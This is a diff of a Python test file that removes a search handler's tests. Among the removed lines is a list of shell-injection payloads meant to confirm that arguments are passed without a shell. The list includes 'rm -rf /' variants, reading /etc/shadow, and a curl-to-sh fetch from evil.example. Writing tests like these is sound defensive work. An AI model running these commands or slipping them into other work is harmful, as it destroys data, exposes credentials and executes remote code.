@@ -22,19 +22,9 @@ _REPO_ROOT = Path(__file__).resolve().parents[2]
 if str(_REPO_ROOT) not in sys.path:
     sys.path.insert(0, str(_REPO_ROOT))
 
-from services.tools.handlers import build, format_check, lint, search, static_analysis  # noqa: E402
+from services.tools.handlers import build, format_check, lint, static_analysis  # noqa: E402
 
-MALICIOUS_STRINGS = [
-    "; rm -rf /",
-    "$(rm -rf /)",
-    "`rm -rf /`",
-    "a && rm -rf / && b",
-    "a || cat /etc/shadow",
-    "$(curl evil.example/x | sh)",
-    "a; rm -rf / #",
-]
-
-# Same idea, but with no '/' or ':' characters, so these are legal single
+# No '/' or ':' characters, so these are legal single
 # path *segments* under path_safety's rules (a filename may legally contain
 # shell metacharacters on POSIX - the safety guarantee comes from never
 # invoking a shell, not from sanitizing filenames).
@@ -78,15 +68,6 @@ class TestArgvIsAlwaysAList:
             assert all(isinstance(part, str) for part in argv)
             assert call.kwargs.get("shell") is False
 
-    def test_search_uses_list_argv_and_no_shell(self, project_root: Path) -> None:
-        with mock.patch("services.tools.handlers.search.subprocess.run") as mock_run:
-            mock_run.return_value = _completed(["rg"], returncode=1)
-            search.run_search("anything", False, project_root, timeout_seconds=30)
-
-        argv = mock_run.call_args.args[0]
-        assert isinstance(argv, list)
-        assert mock_run.call_args.kwargs.get("shell") is False
-
     def test_lint_uses_list_argv_and_no_shell(self, project_root: Path) -> None:
         with mock.patch("services.tools.handlers.lint.subprocess.run") as mock_run:
             mock_run.return_value = _completed(["clang-tidy"], returncode=0)
@@ -113,23 +94,6 @@ class TestArgvIsAlwaysAList:
         argv = mock_run.call_args.args[0]
         assert isinstance(argv, list)
         assert mock_run.call_args.kwargs.get("shell") is False
-
-
-class TestMaliciousPatternPassesThroughAsInertArgvElement:
-    @pytest.mark.parametrize("payload", MALICIOUS_STRINGS)
-    def test_search_pattern_is_a_single_literal_argv_element(self, payload: str, project_root: Path) -> None:
-        with mock.patch("services.tools.handlers.search.subprocess.run") as mock_run:
-            mock_run.return_value = _completed(["rg"], returncode=1)
-            search.run_search(payload, False, project_root, timeout_seconds=30)
-
-        argv = mock_run.call_args.args[0]
-        assert payload in argv
-        assert argv.count(payload) == 1
-        # It must appear as exactly one element, not split by a shell into
-        # several tokens (e.g. "; rm -rf /" becoming ["; rm -rf /"], not
-        # ["", "rm", "-rf", "/"]).
-        matching = [part for part in argv if part == payload]
-        assert len(matching) == 1
 
 
 class TestMaliciousPathSegmentPassesThroughAsInertArgvElement:
